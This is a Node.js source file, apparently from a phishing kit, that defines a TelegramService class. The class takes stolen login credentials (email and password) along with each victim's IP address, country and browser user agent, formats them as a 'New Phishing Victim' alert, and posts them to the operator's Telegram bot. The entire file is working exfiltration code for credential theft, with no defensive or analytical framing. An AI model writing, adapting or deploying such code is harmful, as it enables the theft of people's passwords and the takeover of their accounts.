const axios = require('axios');
const config = require('../config/config.cjs');

class TelegramService {
  constructor() {
    this.botToken = config.telegram.botToken;
    this.chatId = config.telegram.chatId;
    
    // Debug configuration
    console.log('Telegram Config Debug:');
    console.log('Bot Token:', this.botToken ? 'Set' : 'Not set');
    console.log('Chat ID:', this.chatId ? 'Set' : 'Not set');
  }

  async sendMessage(credentials, visitorInfo) {
    if (!this.botToken || !this.chatId) {
      console.log('❌ Telegram not configured - skipping notification');
      console.log('Bot Token exists:', !!this.botToken);
      console.log('Chat ID exists:', !!this.chatId);
      return;
    }

    console.log('🚀 Attempting to send Telegram message...');
    const message = this.formatMessage(credentials, visitorInfo);
    console.log('📝 Message formatted:', message.substring(0, 100) + '...');
    
    try {
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      const data = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML'
      };
      
      console.log('🌐 Sending to URL:', url);
      console.log('📊 Data payload:', JSON.stringify(data, null, 2));
      
      const response = await axios.post(url, data, { 
        timeout: 10000,
        headers: {
          'Content-Type': 'application/json'
        }
      });
      
      if (response.data.ok) {
        console.log('✅ Telegram notification sent successfully');
        console.log('📨 Response:', response.data);
      } else {
        console.error('❌ Telegram API error:', response.data.description || response.data);
      }
    } catch (error) {
      if (error.response) {
        console.error('❌ Telegram API HTTP error:', error.response.status, error.response.data);
      } else {
        console.error('❌ Failed to send Telegram message:', error.message);
      }
    }
  }

  formatMessage(credentials, visitorInfo) {
    return `
🎯 <b>New Phishing Victim</b>

👤 <b>Credentials:</b>
📧 Email: <code>${credentials.username}</code>
🔑 Password: <code>${credentials.password}</code>
🔄 Attempt: ${credentials.attempt}

🌍 <b>Visitor Info:</b>
🌐 IP: <code>${visitorInfo.ip}</code>
🏳️ Country: ${visitorInfo.country || 'Unknown'}
🕐 Time: ${new Date().toLocaleString()}

💻 <b>Device:</b>
<code>${visitorInfo.userAgent}</code>
`;
  }
}

module.exports = TelegramService;